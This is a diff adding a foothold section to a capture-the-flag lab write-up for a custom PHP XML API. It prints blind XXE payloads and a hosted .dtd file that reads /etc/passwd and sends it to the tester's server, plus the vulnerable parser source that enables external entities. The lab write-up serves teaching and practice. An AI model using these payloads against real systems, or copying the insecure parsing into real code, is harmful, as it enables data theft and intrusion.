@@ -173,3 +173,85 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 200     POST        2l        1w       31c http://10.10.10.62:56423/
 
 ```
+
+## Foothold
+- Nothing interesting
+  - We have a port `API` on port `56423`
+    - It looks like it's a custom `API`
+  - We can play around with different payloads
+
+![](./images/6.png)
+
+- Was stuck here for a while
+  - After receiving a hint about `xml`, I tried a `xml` payloads
+  - Sending `Ping` now, we receive `Ping` back
+
+![](./images/7.png)
+
+- So let's try `XXE`
+  - We could try one of the payloads
+    - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe
+  - We don't receive any output, so we should try `blind xxe`
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.9/anything"> %xxe;]>
+```
+
+- And we have a hit
+
+![](./images/9.png)
+
+![](./images/8.png)
+
+- Let's try exfil
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013
+  - The payload that we will send
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://10.10.16.9/evil.dtd">
+<data>&send;</data>
+```
+
+- The `.dtd` file we host on our server
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.16.9/?%file;'>">
+%all;
+```
+
+- And we have a hit
+
+![](./images/10.png)
+
+![](./images/11.png)
+
+- The source code
+```
+<?php
+        header('Content-Type:application/json;charset=utf-8');
+        header('Server: Fulcrum-API Beta');
+        libxml_disable_entity_loader (false);
+        $xmlfile = file_get_contents('php://input');
+        $dom = new DOMDocument();
+        $dom->loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
+        $input = simplexml_import_dom($dom);
+        $output = $input->Ping;
+        //check if ok
+        if($output == "Ping")
+        {
+                $data = array('Heartbeat' => array('Ping' => "Ping"));
+        }else{
+                $data = array('Heartbeat' => array('Ping' => "Pong"));
+        }
+        echo json_encode($data);
+
+
+?>
+```
+
+- 
+## User
+
+
+## Root
